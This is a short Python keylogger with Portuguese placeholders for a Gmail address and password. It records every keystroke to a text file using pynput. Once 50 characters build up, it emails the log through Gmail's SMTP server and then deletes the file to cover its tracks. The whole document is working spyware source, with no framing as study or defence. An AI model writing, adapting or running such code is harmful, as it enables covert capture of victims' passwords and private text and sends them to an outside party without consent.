from pynput import keyboard
import os
import smtplib
import subprocess

def on_press(key):
    global f
    try:
        f = open('output.txt', "a")
        f.write(key.char)
        ('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        ('special key {0} pressed'.format(
            key))


def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.space:
        f.write(' ')
    if key == keyboard.Key.enter:
        f.write(os.linesep)

    if key == keyboard.Key.caps_lock:
        f.write('_CAPS_')

    if key == keyboard.Key.shift_l:
        f.write('_SHIFT_')
    if key == keyboard.Key.shift_r:
        f.write('_SHIFT_')

    if key == keyboard.Key.esc:
        # Stop listener
        return False


def send_email():
    arq = (open('output.txt', 'r').read())

    if len(arq) >= 50:
        fromaddr = 'SEU GMAIL'
        toaddr = 'SEU GMAIL'
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, 'SUA SENHA   ')
        msg = open('output.txt', 'r').read()
        server.sendmail(from_addr=fromaddr, to_addrs=toaddr, msg=msg)
        server.quit()
        f.close()


        os.system('del output.txt')
        
        print('[+] Enviado')
        print('[+] Apagado')
    else:
        print('[-] Não ENviado')
        main()



# Collect events until released
def main():
    with keyboard.Listener(on_press=on_press,
                           on_release=on_release) as listener:
        listener.join()


main()
send_email()
